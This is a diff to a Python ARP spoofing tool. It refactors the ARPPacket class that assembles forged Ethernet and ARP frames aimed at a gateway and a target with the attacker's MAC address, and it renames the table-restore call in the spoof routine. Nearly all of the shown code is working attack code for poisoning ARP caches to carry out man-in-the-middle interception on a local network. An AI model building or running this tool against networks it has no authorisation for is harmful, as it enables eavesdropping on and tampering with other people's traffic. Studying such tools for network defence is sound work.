@@ -20,37 +20,32 @@ i = ' ' * 4  # Basic indentation level
 class ARPPacket(object):
     def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                  gateway_ip: str, target_ip: str):
-        self.gateway_ip = inet_aton(gateway_ip)
-        self.target_ip = inet_aton(target_ip)
-        self.__hexlify_mac_addresses(attacker_mac, gateway_mac, target_mac)
-        self.eth_frame_to_gateway = self.gateway_mac + self.attacker_mac \
-                                    + b'\x08\x06'  # Ethertype of ARP IEEE 802.3
-        self.eth_frame_to_target = self.target_mac + self.attacker_mac \
-                                   + b'\x08\x06'
-        self.restore_arp_table: bool = False
-        self.build()
+        self.__set_ip_addresses_to_bytes(gateway_ip, target_ip)
+        self.__set_mac_addresses_to_bytes(attacker_mac, gateway_mac, target_mac)
+        self.__build_ethernet_frames()
+        self.__build_arp_header()
+        self.__build_packet_to_gateway()
+        self.__build_packet_to_target()
 
     def __iter__(self):
         yield from (self.packet_to_gateway, self.packet_to_target)
 
-    def restore_target_table(self):
-        self.restore_arp_table = True
-        self.build()
+    def __set_ip_addresses_to_bytes(self, *args):
+        for ip_name, ip_address in zip(('gateway_ip', 'target_ip'), args):
+            setattr(self, ip_name, inet_aton(ip_address))
 
-    def __hexlify_mac_addresses(self, *args):
-        for mac_name, mac_address in \
-                zip(('attacker_mac', 'gateway_mac', 'target_mac'), args):
-            setattr(self, mac_name, self.__mac_to_hex(mac_address))
+    def __set_mac_addresses_to_bytes(self, *args):
+        def mac_to_hex(mac):
+            return b''.join(bytes.fromhex(octet) for octet in
+                            re.split('[:-]', mac))
+        for mac_name, mac_address in zip(('attacker_mac', 'gateway_mac',
+                                          'target_mac'), args):
+            setattr(self, mac_name, mac_to_hex(mac_address))
 
-    @staticmethod
-    def __mac_to_hex(mac_address: str) -> bytes:
-        """
-        Transform a MAC address string from IEEE 802.3 standard to a
-        byte sequence of hexadecimal values.
-        Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12\x23\x34'
-        """
-        return b''.join(bytes.fromhex(octet) for octet in
-                        re.split('[:-]', mac_address))
+    def __build_ethernet_frames(self):  # Defined by IEEE 802.3
+        dest_and_protocol = self.attacker_mac + b'\x08\x06'
+        self.eth_frame_to_gateway = self.gateway_mac + dest_and_protocol
+        self.eth_frame_to_target = self.target_mac + dest_and_protocol
 
     def __build_arp_header(self):       # Defined by IETF RFC 826
         hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
@@ -115,7 +110,7 @@ def spoof(args):
         print('[!] Aborting ARP Spoofing attack...')
         print('{0}[+] Attempting to restore target ARP tables to their '
               'previous states...'.format(i))
-        packets.restore_target_table()
+        packets.restore_arp_tables()
         spoofer.execute(max_packets=20, interval=1)
         raise SystemExit('{0}[+] ARP Spoofing attack terminated.'.format(i))
 
